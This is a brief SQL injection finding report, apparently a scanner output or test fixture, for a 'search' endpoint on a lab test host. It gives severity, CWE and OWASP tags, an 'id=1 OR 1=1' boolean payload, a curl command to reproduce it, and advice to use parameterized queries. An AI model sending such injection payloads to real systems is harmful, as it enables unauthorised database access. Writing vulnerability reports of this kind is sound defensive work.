# Legacy SQL injection report

- **Severity:** high
- **Candidate ID:** cand_legacy0123456789
- **Vulnerability Type:** SQL Injection
- **CWE:** CWE-89
- **OWASP:** A03:2021 Injection
- **URL:** https://lab.example.test/search
- **Method:** GET
- **Parameter:** id
- **Reported at:** 2026-09-24T00:00:00+00:00

## Impact

A repeatable boolean difference was recorded.

## Payload

```
id=1 OR 1=1
```

## Response excerpt

```
The true condition returned a matching record.
```

## Reproduce

```sh
curl 'https://lab.example.test/search?id=1%20OR%201=1'
```

## Remediation

Use parameterized queries.

